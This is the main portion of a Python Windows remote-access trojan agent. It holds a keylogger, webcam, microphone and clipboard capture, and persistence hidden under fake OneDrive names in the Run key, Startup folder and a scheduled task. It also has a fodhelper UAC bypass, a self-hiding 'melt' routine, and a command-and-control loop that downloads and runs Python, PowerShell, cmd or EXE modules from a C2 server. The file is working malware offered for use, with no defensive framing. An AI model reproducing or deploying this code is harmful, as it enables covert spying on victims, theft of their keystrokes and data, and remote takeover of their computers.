            elif 'Media disconnected' in line:
                current['status'] = 'Disconnected'
    
    if current:
        adapters.append(current)
    
    # Filter to only connected adapters with IPs
    active = [a for a in adapters if a['ip'] and a['status'] == 'Up']
    
    return json.dumps({
        'public_ip': PUBLIC_IP,
        'adapters': active if active else adapters[:5]  # Show first 5 if none active
    })

def m_installed():
    """Installed applications with publisher, size, install date"""
    apps = []
    keys = [
        r'SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall',
        r'SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall'
    ]
    for root in [winreg.HKEY_LOCAL_MACHINE, winreg.HKEY_CURRENT_USER]:
        for key_path in keys:
            try:
                key = winreg.OpenKey(root, key_path)
                for i in range(winreg.QueryInfoKey(key)[0]):
                    try:
                        subkey_name = winreg.EnumKey(key, i)
                        subkey = winreg.OpenKey(key, subkey_name)
                        try:
                            name = winreg.QueryValueEx(subkey, 'DisplayName')[0]
                            
                            # Version
                            version = ''
                            try:
                                version = winreg.QueryValueEx(subkey, 'DisplayVersion')[0]
                            except:
                                pass
                            
                            # Publisher
                            publisher = ''
                            try:
                                publisher = winreg.QueryValueEx(subkey, 'Publisher')[0]
                            except:
                                pass
                            
                            # Size (KB -> MB)
                            size = 0
                            try:
                                size_kb = winreg.QueryValueEx(subkey, 'EstimatedSize')[0]
                                size = round(size_kb / 1024, 1)  # Convert to MB
                            except:
                                pass
                            
                            # Install Date
                            install_date = ''
                            try:
                                install_date = winreg.QueryValueEx(subkey, 'InstallDate')[0]
                            except:
                                pass
                            
                            apps.append({
                                'name': name,
                                'version': version,
                                'publisher': publisher,
                                'size': size,  # in MB
                                'date': install_date
                            })
                        except:
                            pass
                        winreg.CloseKey(subkey)
                    except:
                        pass
                winreg.CloseKey(key)
            except:
                pass
    return json.dumps(sorted(apps, key=lambda x: x['name'].lower()))

def m_uninstall(name):
    """Uninstall application"""
    try:
        keys = [r'SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall']
        for key_path in keys:
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path)
            for i in range(winreg.QueryInfoKey(key)[0]):
                try:
                    subkey_name = winreg.EnumKey(key, i)
                    subkey = winreg.OpenKey(key, subkey_name)
                    try:
                        app_name = winreg.QueryValueEx(subkey, 'DisplayName')[0]
                        if name.lower() in app_name.lower():
                            uninstall = winreg.QueryValueEx(subkey, 'UninstallString')[0]
                            silent_popen(uninstall)
                            return json.dumps({'status': 'uninstalling'})
                    except:
                        pass
                    winreg.CloseKey(subkey)
                except:
                    pass
            winreg.CloseKey(key)
        return json.dumps({'error': 'App not found'})
    except Exception as e:
        return json.dumps({'error': str(e)})

# ============== KEYLOGGER (Fixed Double Detection) ==============
KL_FILE = Path(tempfile.gettempdir()) / '.kl'
KL_ACTIVE = False
KL_THREAD = None

def kl_loop():
    """Keylogger thread - with per-key cooldown to prevent double-detection"""
    global KL_ACTIVE
    user32 = ctypes.windll.user32
    
    # Per-key cooldown tracking: vk -> last_logged_time
    key_cooldowns = {}
    KEY_COOLDOWN_MS = 200  # 200ms minimum between same key
    
    while KL_ACTIVE:
        time.sleep(0.050)  # 50ms poll - balanced responsiveness vs CPU
        current_time = time.perf_counter() * 1000  # Convert to milliseconds
        
        for vk in range(8, 255):
            # Skip modifier keys themselves
            if vk in (16, 17, 18, 160, 161, 162, 163, 164, 165):  # Shift, Ctrl, Alt variants
                continue
            
            # GetAsyncKeyState - check if key is currently down
            state = user32.GetAsyncKeyState(vk)
            is_pressed = (state & 0x8000) != 0
            
            if is_pressed:
                # Check cooldown
                last_time = key_cooldowns.get(vk, 0)
                if current_time - last_time < KEY_COOLDOWN_MS:
                    continue  # Still in cooldown
                
                # Log this key
                key_cooldowns[vk] = current_time
                
                char = ''
                
                # Get modifier states
                shift = (user32.GetAsyncKeyState(0x10) & 0x8000) != 0
                caps = (user32.GetKeyState(0x14) & 1) != 0
                ctrl = (user32.GetAsyncKeyState(0x11) & 0x8000) != 0
                
                # Skip if Ctrl is held (shortcuts)
                if ctrl:
                    continue
                
                # Map virtual key to character
                if vk == 8:
                    char = '[BS]'
                elif vk == 9:
                    char = '[TAB]'
                elif vk == 13:
                    char = '\n'
                elif vk == 27:
                    char = '[ESC]'
                elif vk == 32:
                    char = ' '
                elif vk == 46:
                    char = '[DEL]'
                elif 112 <= vk <= 123:  # F1-F12
                    char = f'[F{vk - 111}]'
                elif 65 <= vk <= 90:  # A-Z
                    upper = (caps and not shift) or (shift and not caps)
                    char = chr(vk) if upper else chr(vk + 32)
                elif 48 <= vk <= 57:  # 0-9
                    if shift:
                        symbols = ')!@#$%^&*('
                        char = symbols[vk - 48]
                    else:
                        char = chr(vk)
                elif 96 <= vk <= 105:  # Numpad
                    char = chr(vk - 48)
                elif vk == 186: char = ':' if shift else ';'
                elif vk == 187: char = '+' if shift else '='
                elif vk == 188: char = '<' if shift else ','
                elif vk == 189: char = '_' if shift else '-'
                elif vk == 190: char = '>' if shift else '.'
                elif vk == 191: char = '?' if shift else '/'
                elif vk == 192: char = '~' if shift else '`'
                elif vk == 219: char = '{' if shift else '['
                elif vk == 220: char = '|' if shift else '\\'
                elif vk == 221: char = '}' if shift else ']'
                elif vk == 222: char = '"' if shift else "'"
                
                if char:
                    try:
                        with open(KL_FILE, 'a', encoding='utf-8') as f:
                            f.write(char)
                    except:
                        pass


def m_kl_start():
    global KL_ACTIVE, KL_THREAD
    if KL_ACTIVE:
        return json.dumps({'status': 'already_running', 'active': True})
    
    KL_FILE.write_text('', encoding='utf-8')
    KL_ACTIVE = True
    KL_THREAD = threading.Thread(target=kl_loop, daemon=True)
    KL_THREAD.start()
    return json.dumps({'status': 'started', 'active': True})

def m_kl_stop():
    global KL_ACTIVE
    KL_ACTIVE = False
    return json.dumps({'status': 'stopped', 'active': False})

def m_kl_dump():
    try:
        data = KL_FILE.read_text(encoding='utf-8') if KL_FILE.exists() else ''
        # Escape for JSON
        data = data.replace('\\', '\\\\').replace('"', '\\"').replace('\n', '\\n').replace('\r', '\\r')
        return json.dumps({'data': data, 'active': KL_ACTIVE})
    except:
        return json.dumps({'data': '', 'active': KL_ACTIVE})

def m_kl_clear():
    try:
        KL_FILE.write_text('', encoding='utf-8')
        return json.dumps({'status': 'cleared'})
    except:
        return json.dumps({'error': 'Clear failed'})

# ============== PERSISTENCE ==============
def m_persist_check():
    registry = False
    startup = False
    task = False
    
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run')
        winreg.QueryValueEx(key, 'OneDriveUpdate')
        registry = True
        winreg.CloseKey(key)
    except:
        pass
    
    startup_path = Path(os.environ['APPDATA']) / 'Microsoft' / 'Windows' / 'Start Menu' / 'Programs' / 'Startup' / 'OneDriveSync.bat'
    startup = startup_path.exists()
    
    task_check = silent_run('schtasks /query /tn "Microsoft\\OneDrive\\OneDriveStandaloneUpdater"')
    task = 'ERROR' not in task_check.upper()
    
    return json.dumps({
        'registry': registry,
        'startup': startup,
        'task': task,
        'any': registry or startup or task
    })

def m_persist_install(target_path=None):
    """Install persistence for the specified executable path"""
    try:
        # Use provided path or fall back to current executable
        exe_path = target_path or (sys.executable if getattr(sys, 'frozen', False) else __file__)
        
        # Registry - Use OneDrive name for stealth
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run')
        winreg.SetValueEx(key, 'OneDriveUpdate', 0, winreg.REG_SZ, f'"{exe_path}"')
        winreg.CloseKey(key)
        
        # Startup folder - Use legitimate looking name
        startup_path = Path(os.environ['APPDATA']) / 'Microsoft' / 'Windows' / 'Start Menu' / 'Programs' / 'Startup' / 'OneDriveSync.bat'
        startup_path.write_text(f'@echo off\nstart "" "{exe_path}"')
        
        # Task scheduler (if admin) - Legitimate name
        if is_admin():
            silent_run(f'schtasks /create /tn "Microsoft\\OneDrive\\OneDriveStandaloneUpdater" /tr "{exe_path}" /sc onlogon /rl highest /f')
        
        return m_persist_check()
    except Exception as e:
        return json.dumps({'error': str(e)})

def m_persist_remove():
    try:
        # Registry
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_SET_VALUE)
            winreg.DeleteValue(key, 'OneDriveUpdate')
            winreg.CloseKey(key)
        except:
            pass
        
        # Startup folder
        startup_path = Path(os.environ['APPDATA']) / 'Microsoft' / 'Windows' / 'Start Menu' / 'Programs' / 'Startup' / 'OneDriveSync.bat'
        startup_path.unlink(missing_ok=True)
        
        # Task scheduler
        silent_run('schtasks /delete /tn "Microsoft\\OneDrive\\OneDriveStandaloneUpdater" /f')
        
        # Also delete the hidden executable
        hidden_exe = Path(os.environ['LOCALAPPDATA']) / 'Microsoft' / 'OneDrive' / 'OneDriveUpdater.exe'
        hidden_exe.unlink(missing_ok=True)
        
        return m_persist_check()
    except Exception as e:
        return json.dumps({'error': str(e)})

# ============== PRIVILEGE ==============
def m_priv_check():
    return json.dumps({
        'isAdmin': is_admin(),
        'integrity': PRIVILEGE,
        'username': USERNAME,
        'canElevate': not is_admin()
    })

def m_priv_escalate():
    """UAC bypass via fodhelper"""
    if is_admin():
        return json.dumps({'status': 'already_admin'})
    
    try:
        exe_path = sys.executable if getattr(sys, 'frozen', False) else __file__
        
        # Create registry keys
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r'Software\Classes\ms-settings\Shell\Open\command')
        winreg.SetValueEx(key, '', 0, winreg.REG_SZ, f'"{exe_path}"')
        winreg.SetValueEx(key, 'DelegateExecute', 0, winreg.REG_SZ, '')
        winreg.CloseKey(key)
        
        # Trigger fodhelper
        silent_popen('fodhelper.exe')
        time.sleep(2)
        
        # Cleanup
        try:
            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, r'Software\Classes\ms-settings\Shell\Open\command')
            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, r'Software\Classes\ms-settings\Shell\Open')
            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, r'Software\Classes\ms-settings\Shell')
            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, r'Software\Classes\ms-settings')
        except:
            pass
        
        return json.dumps({'status': 'escalation_triggered', 'method': 'fodhelper'})
    except Exception as e:
        return json.dumps({'error': str(e)})

# ============== FILE OPS ==============
def m_file_write(args):
    try:
        parts = args.split('|', 1)
        if len(parts) != 2:
            return json.dumps({'error': 'Usage: path|content'})
        path, content = parts
        Path(path).write_text(content)
        return json.dumps({'status': 'written'})
    except Exception as e:
        return json.dumps({'error': str(e)})

def m_file_read(path):
    try:
        content = Path(path).read_text()
        return json.dumps({'content': content})
    except Exception as e:
        return json.dumps({'error': str(e)})

def m_startup():
    """List startup items"""
    items = []
    
    # Registry - HKCU
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run')
        for i in range(winreg.QueryInfoKey(key)[1]):
            name, value, _ = winreg.EnumValue(key, i)
            items.append({'location': 'HKCU\\Run', 'name': name})
        winreg.CloseKey(key)
    except:
        pass
    
    # Registry - HKLM
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r'Software\Microsoft\Windows\CurrentVersion\Run')
        for i in range(winreg.QueryInfoKey(key)[1]):
            name, value, _ = winreg.EnumValue(key, i)
            items.append({'location': 'HKLM\\Run', 'name': name})
        winreg.CloseKey(key)
    except:
        pass
    
    # Startup folder
    startup_folder = Path(os.environ['APPDATA']) / 'Microsoft' / 'Windows' / 'Start Menu' / 'Programs' / 'Startup'
    try:
        for item in startup_folder.iterdir():
            items.append({'location': 'Startup Folder', 'name': item.name})
    except:
        pass
    
    return json.dumps(items)

# ============== WEBCAM ==============
def m_webcam():
    """Capture webcam image (requires ffmpeg)"""
    try:
        # Check for ffmpeg
        ffmpeg_check = silent_run('where ffmpeg')
        if 'not find' in ffmpeg_check.lower() or not ffmpeg_check.strip():
            return json.dumps({'error': 'Webcam requires ffmpeg'})
        
        path = os.path.join(tempfile.gettempdir(), f'cam_{int(time.time())}.jpg')
        
        # List devices and get first video device
        devices = silent_run('ffmpeg -list_devices true -f dshow -i dummy', timeout=10)
        video_device = None
        for line in devices.split('\n'):
            if 'video' in line.lower() and '"' in line:
                match = line.split('"')
                if len(match) >= 2:
                    video_device = match[1]
                    break
        
        if not video_device:
            return json.dumps({'error': 'No webcam found'})
        
        # Capture frame
        silent_run(f'ffmpeg -f dshow -i "video={video_device}" -frames:v 1 -y "{path}"', timeout=15)
        
        if Path(path).exists():
            data = Path(path).read_bytes()
            b64 = base64.b64encode(data).decode()
            Path(path).unlink(missing_ok=True)
            return f"B64|{b64}" # Return simplified B64 for capture
        return json.dumps({'error': 'Webcam capture failed'})
    except Exception as e:
        return json.dumps({'error': str(e)})

def m_webcam_live():
    """Capture webcam frame as base64 for live streaming"""
    try:
        # Check for ffmpeg
        ffmpeg_check = silent_run('where ffmpeg')
        if 'not find' in ffmpeg_check.lower() or not ffmpeg_check.strip():
            return json.dumps({'error': 'Webcam requires ffmpeg'})
        
        path = os.path.join(tempfile.gettempdir(), f'camlive_{int(time.time())}.jpg')
        
        # List devices and get first video device
        devices = silent_run('ffmpeg -list_devices true -f dshow -i dummy', timeout=10)
        video_device = None
        for line in devices.split('\n'):
            if 'video' in line.lower() and '"' in line:
                match = line.split('"')
                if len(match) >= 2:
                    video_device = match[1]
                    break
        
        if not video_device:
            return json.dumps({'error': 'No webcam found'})
        
        # Capture frame with fast settings for live view
        silent_run(f'ffmpeg -f dshow -i "video={video_device}" -frames:v 1 -q:v 10 -y "{path}"', timeout=10)
        
        if Path(path).exists():
            data = Path(path).read_bytes()
            b64 = base64.b64encode(data).decode()
            
            # Get image dimensions (approximate - standard webcam)
            width = 640
            height = 480
            
            Path(path).unlink(missing_ok=True)
            return f"B64|{width}|{height}|{b64}"
        
        return json.dumps({'error': 'Webcam capture failed'})
    except Exception as e:
        return json.dumps({'error': str(e)})

# ============== MICROPHONE ==============
def m_microphone(seconds=10):
    """Record microphone audio"""
    try:
        path = os.path.join(tempfile.gettempdir(), f'mic_{int(time.time())}.wav')
        
        # Use Windows built-in sound recorder via mciSendString
        from ctypes import wintypes
        winmm = ctypes.windll.winmm
        
        mciSendString = winmm.mciSendStringW
        mciSendString.argtypes = [ctypes.c_wchar_p, ctypes.c_wchar_p, ctypes.c_uint, ctypes.c_void_p]
        mciSendString.restype = ctypes.c_int
        
        buffer = ctypes.create_unicode_buffer(256)
        
        mciSendString("open new type waveaudio alias mic", buffer, 256, None)
        mciSendString("record mic", buffer, 256, None)
        time.sleep(int(seconds))
        mciSendString("stop mic", buffer, 256, None)
        mciSendString(f'save mic "{path}"', buffer, 256, None)
        mciSendString("close mic", buffer, 256, None)
        
        if Path(path).exists():
            return path
        return json.dumps({'error': 'Recording failed'})
    except Exception as e:
        return json.dumps({'error': str(e)})

# ============== CLIPBOARD IMAGE ==============
def m_clipboard_image():
    """Get clipboard image as base64"""
    try:
        user32 = ctypes.windll.user32
        
        # Check if clipboard has image
        CF_BITMAP = 2
        if not user32.IsClipboardFormatAvailable(CF_BITMAP):
            return json.dumps({'hasImage': False})
        
        # Open clipboard
        user32.OpenClipboard(0)
        try:
            # Get bitmap handle
            hBitmap = user32.GetClipboardData(CF_BITMAP)
            if not hBitmap:
                return json.dumps({'hasImage': False})
            
            # Save as file using GDI
            path = os.path.join(tempfile.gettempdir(), f'clip_{int(time.time())}.bmp')
            
            # Use PowerShell to save clipboard image (silent)
            ps_cmd = f'''
            Add-Type -AssemblyName System.Windows.Forms
            if ([System.Windows.Forms.Clipboard]::ContainsImage()) {{
                $img = [System.Windows.Forms.Clipboard]::GetImage()
                $img.Save("{path}")
                $img.Dispose()
            }}
            '''
            silent_run(f'powershell -Command "{ps_cmd}"')
            
            if Path(path).exists():
                data = Path(path).read_bytes()
                b64 = base64.b64encode(data).decode()
                Path(path).unlink(missing_ok=True)
                return json.dumps({'hasImage': True, 'data': b64})
            
            return json.dumps({'hasImage': False})
        finally:
            user32.CloseClipboard()
    except Exception as e:
        return json.dumps({'error': str(e)})

# ============== STEALTH ==============
def m_stealth_enable():
    """
    APT-Grade Stealth:
    1. Copy to legitimate-looking OneDrive location
    2. Set Hidden+System attributes
    3. Register HIDDEN file for persistence (not the original)
    4. Launch hidden copy
    5. Self-delete original (Melt)
    """
    try:
        original_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
        
        # Stealth destination - Mimics real OneDrive updater
        onedrive_dir = Path(os.environ['LOCALAPPDATA']) / 'Microsoft' / 'OneDrive'
        onedrive_dir.mkdir(parents=True, exist_ok=True)
        dest = onedrive_dir / 'OneDriveUpdater.exe'
        
        # Copy self to hidden location
        shutil.copy(original_path, dest)
        
        # Set Hidden + System attributes
        ctypes.windll.kernel32.SetFileAttributesW(str(dest), 0x02 | 0x04)
        
        # Install persistence pointing to THE HIDDEN FILE
        m_persist_install(str(dest))
        
        # Launch the hidden copy (it will become the "real" agent)
        subprocess.Popen([str(dest)], creationflags=CREATE_NO_WINDOW)
        
        # Melt: Self-delete original after a short delay
        # ping -n 3 creates ~2 second delay, then del deletes the original
        melt_cmd = f'cmd /c ping -n 3 127.0.0.1 >nul && del /f /q "{original_path}"'
        subprocess.Popen(melt_cmd, shell=True, creationflags=CREATE_NO_WINDOW)
        
        # Exit this (original) process - hidden copy takes over
        sys.exit(0)
        
    except Exception as e:
        return json.dumps({'error': str(e)})

def execute_custom_module(module_id):
    """
    Execute a custom module downloaded from C2.
    Args contains the module_id. We fetch content from C2, save to temp, execute.
    """
    try:
        # Get ngrok URL for C2
        c2_url = get_c2_url()
        if not c2_url:
            return json.dumps({'error': 'C2 offline'})
        
        # Fetch module content from C2 through ngrok
        url = c2_url + f'/api/module.php?action=get&id={module_id}'
        req = urllib.request.Request(url)
        req.add_header('User-Agent', 'Mozilla/5.0')
        
        with urllib.request.urlopen(req, timeout=15) as response:
            data = json.loads(response.read().decode())
        
        if 'error' in data:
            return json.dumps({'error': data['error']})
        
        mod_type = data.get('type', 'cmd')
        content = data.get('content', '')
        
        if not content:
            return json.dumps({'error': 'Empty module content'})
        
        # Execute based on type
        if mod_type == 'python':
            # Save and run Python script
            script_path = Path(tempfile.gettempdir()) / f'm_{module_id}.py'
            script_path.write_text(content)
            output = silent_run(f'python "{script_path}"', timeout=120)
            script_path.unlink(missing_ok=True)
            return json.dumps({'output': output})
            
        elif mod_type == 'powershell':
            # Run PowerShell script directly
            output = silent_run(f'powershell -Command "{content}"', timeout=120)
            return json.dumps({'output': output})
            
        elif mod_type == 'cmd':
            # Run CMD command
            output = silent_run(content, timeout=120)
            return json.dumps({'output': output})
            
        elif mod_type == 'exe':
            # Decode Base64 EXE, save and run
            exe_path = Path(tempfile.gettempdir()) / f'm_{module_id}.exe'
            exe_path.write_bytes(base64.b64decode(content))
            output = silent_run(f'"{exe_path}"', timeout=120)
            exe_path.unlink(missing_ok=True)
            return json.dumps({'output': output})
        
        return json.dumps({'error': f'Unknown module type: {mod_type}'})
        
    except Exception as e:
        return json.dumps({'error': str(e)})

def m_reset():
    """Hard reset: remove persistence, clear files, restart"""
    try:
        m_persist_remove()
        m_kl_stop()
        m_kl_clear()
        
        # Determine restart path
        exe_path = sys.executable
        
        # Schedule restart in separate process (re-run self)
        subprocess.Popen([exe_path] + sys.argv[1:], creationflags=CREATE_NO_WINDOW)
        
        # Exit current process
        sys.exit(0)
    except Exception as e:
        return json.dumps({'error': str(e)})

# ============== MAIN LOOP (Concurrent Execution) ==============
from concurrent.futures import ThreadPoolExecutor

# Thread pool for concurrent task execution
TASK_EXECUTOR = None
MAX_CONCURRENT_TASKS = 5
RUNNING = False

def execute_task(module, args, task_id):
    """Execute a single task - runs in thread pool for concurrency"""
    global RUNNING
    result = ''
    file_path = None
    
    try:
        # Handle modules
        if module == 'kill':
            # Send result first before killing
            send_result(task_id, json.dumps({'status': 'terminated'}), None)
            RUNNING = False
            
            # Kill parent process if different from self
            try:
                import psutil
                current = psutil.Process()
                parent = current.parent()
                if parent and parent.pid != current.pid:
                    parent.terminate()
            except:
                # Try WMI method if psutil not available
                try:
                    ppid = os.getppid()
                    if ppid and ppid != os.getpid():
                        subprocess.run(
                            f'taskkill /F /PID {ppid}',
                            shell=True, timeout=5,
                            creationflags=CREATE_NO_WINDOW, startupinfo=STARTUPINFO
                        )
                except:
                    pass
            
            # Force exit the process
            os._exit(0)
        elif module == 'shell':
            result = m_shell(args)
        elif module == 'powershell':
            result = m_ps(args)
        elif module == 'whoami':
            result = m_whoami()
        elif module == 'sysinfo':
            result = m_sysinfo()
        elif module == 'screenshot':
            file_path = m_screenshot()
            result = json.dumps({'status': 'captured'})
        elif module == 'screenshot_live':
            result = m_screenshot_b64()
        elif module == 'clipboard':
            result = m_clipboard()
        elif module == 'clipboard_set':
            result = m_clipboard_set(args)
        elif module == 'location':
            result = m_location()
        elif module == 'location_geo':
            result = m_location_geo()
        elif module == 'files':
            result = m_files(args)
        elif module == 'drives':
            result = m_drives()
        elif module == 'download':
            f = m_download(args)
            if isinstance(f, str) and not f.startswith('{') and Path(f).exists():
                file_path = f
                result = json.dumps({'status': 'downloading'})
            else:
                result = f
        elif module == 'delete':
            result = m_delete(args)
        elif module == 'rename':
            result = m_rename(args)
        elif module == 'mkdir':
            result = m_mkdir(args)
        elif module == 'processes':
            result = m_processes()
        elif module == 'kill_process':
            result = m_kill_process(args)
        elif module == 'run':
            result = m_run(args)
        elif module == 'wifi':
            result = m_wifi()
        elif module == 'network':
            result = m_network()
        elif module == 'installed':
            result = m_installed()
        elif module == 'uninstall':
            result = m_uninstall(args)
        elif module == 'keylogger_start':
            result = m_kl_start()
        elif module == 'keylogger_dump':
            result = m_kl_dump()
        elif module == 'keylogger_stop':
            result = m_kl_stop()
        elif module == 'keylogger_clear':
            result = m_kl_clear()
        elif module == 'persistence_check':
            result = m_persist_check()
        elif module == 'persistence_install':
            result = m_persist_install()
        elif module == 'persistence_remove':
            result = m_persist_remove()
        elif module == 'startup':
            result = m_startup()
        elif module == 'webcam':
            f = m_webcam()
            if isinstance(f, str) and Path(f).exists():
                file_path = f
                result = json.dumps({'status': 'captured'})
            else:
                result = f
        elif module == 'webcam_live':
            result = m_webcam_live()
        elif module == 'microphone':
            sec = int(args) if args and args.isdigit() else 10
            f = m_microphone(sec)
            if isinstance(f, str) and Path(f).exists():
                file_path = f
                result = json.dumps({'status': 'recorded'})
            else:
                result = f
        elif module == 'clipboard_image':
            result = m_clipboard_image()
        elif module == 'file_write':
            result = m_file_write(args)
        elif module == 'file_read':
            result = m_file_read(args)
        elif module == 'privilege_check':
            result = m_priv_check()
        elif module == 'privilege_escalate':
            result = m_priv_escalate()
        elif module == 'stealth_enable':
            result = m_stealth_enable()
        elif module == 'reset':
            result = m_reset() # New Reset Command
        elif module == 'execute_custom':
            # Dynamic module execution - args contains module_id
            result = execute_custom_module(args)
        else:
            result = json.dumps({'error': f'Unknown module: {module}'})
        
        # Send result
        send_result(task_id, result, file_path)
        
        # Cleanup temp files
        if file_path and Path(file_path).exists() and 'TEMP' in file_path.upper():
            try:
                Path(file_path).unlink()
            except:
                pass
                
    except Exception as e:
        send_result(task_id, json.dumps({'error': str(e)}), None)

def main():
    """Main loop with concurrent task execution and aggressive reconnection"""
    global RUNNING, TASK_EXECUTOR, c2_url
    RUNNING = True
    
    # Create thread pool for concurrent execution
    TASK_EXECUTOR = ThreadPoolExecutor(max_workers=MAX_CONCURRENT_TASKS)
    
    # Connection failure tracking
    consecutive_failures = 0
    
    try:
        while RUNNING:
            try:
                response = send_request({
                    'action': 'checkin',
                    'hwid': HWID,
                    'hostname': HOSTNAME,
                    'ip': PUBLIC_IP,
                    'user': USERNAME,
                    'integrity': PRIVILEGE,
                    'os': OS_NAME
                })
                
                if response:
                    # Connection successful
                    consecutive_failures = 0
                    
                    if response.get('status') == 'task':
                        module = response.get('module', '')
                        args = response.get('args', '')
                        task_id = response.get('id', '')
                        
                        # Submit task to thread pool for concurrent execution
                        TASK_EXECUTOR.submit(execute_task, module, args, task_id)
                    
                    time.sleep(POLL_INTERVAL)
                else:
                    # Connection failed
                    consecutive_failures += 1
                    
                    # Force fresh URL fetch after 3 failures
                    if consecutive_failures >= 3:
                        c2_url = None  # Clear cache, force fresh fetch
                    
                    # Aggressive retry when offline: 5 seconds
                    time.sleep(5)
                
            except KeyboardInterrupt:
                break
            except:
                consecutive_failures += 1
                c2_url = None  # Force fresh URL on error
                time.sleep(5)
    finally:
        m_kl_stop()
        if TASK_EXECUTOR:
            TASK_EXECUTOR.shutdown(wait=False)

if __name__ == '__main__':
    try:
        # Check for worker flags (for subprocess isolation)
        if len(sys.argv) > 1 and '--worker-screenshot' in sys.argv:
            run_worker_screenshot()
            sys.exit(0)
            
        main()
    except:
        pass
